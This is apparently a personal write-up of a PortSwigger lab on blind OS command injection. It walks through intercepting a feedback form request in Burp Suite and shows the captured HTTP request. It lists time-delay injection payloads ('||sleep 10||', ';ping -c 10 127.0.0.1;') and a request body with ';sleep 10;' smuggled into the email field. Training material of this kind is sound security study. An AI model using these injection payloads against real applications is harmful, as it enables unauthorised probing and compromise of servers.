# [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)

> injected command to trigger a time delay

- command injection will not give `echo` like response
- delay the reaction of the response
- if that is possible it means that the command injection worked

> feedback request

- open burp suite
- click the "submit feedback" link
- submit a feedback
- check the request and send it tot repeater

```
POST /feedback/submit HTTP/2
Host: 0ad900a904f2604f821f11e0001700a1.web-security-academy.net
Cookie: session=zXSNdDaFtMrBqiHRM8VbLzZhZkxduRHv
Content-Length: 90
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: */*
Origin: https://0ad900a904f2604f821f11e0001700a1.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ad900a904f2604f821f11e0001700a1.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

csrf=dwpH6FyxMAfyXSyns64HNG3LxH0otQeB&name=qwe&email=qwe@qwe&subject=qwe&message=qwe
```

- the interesting part is the body:
  `csrf=dwpH6FyxMAfyXSyns64HNG3LxH0otQeB&name=qwe&email=qwe@qwe&subject=qwe&message=qwe`

> command injection options (there are many more):

- `||ping -c 10 127.0.0.1||`
- `;ping -c 10 127.0.0.1;`
- `||sleep 10||`
- `;sleep 10;`

> command injection

`csrf=dwpH6FyxMAfyXSyns64HNG3LxH0otQeB&name=qwe&email=qwe@qwe;sleep 10;&subject=qwe&message=qwe`

- add any of the options after the email value
